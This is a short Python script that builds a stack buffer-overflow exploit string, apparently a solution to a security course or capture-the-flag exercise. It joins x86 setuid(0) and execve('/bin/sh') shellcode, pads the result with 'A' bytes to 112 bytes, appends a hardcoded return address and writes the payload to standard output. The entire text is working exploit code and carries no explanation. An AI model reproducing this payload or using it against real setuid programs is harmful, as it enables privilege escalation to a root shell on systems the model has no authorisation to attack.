import sys
import struct
from shellcode import shellcode

setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    b'\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

padding_num = 112 - len(shellcode)

address = struct.pack('<I', 0xfff6e04c)

exploit_string = shellcode + b'A' * padding_num + address

sys.stdout.buffer.write(exploit_string)
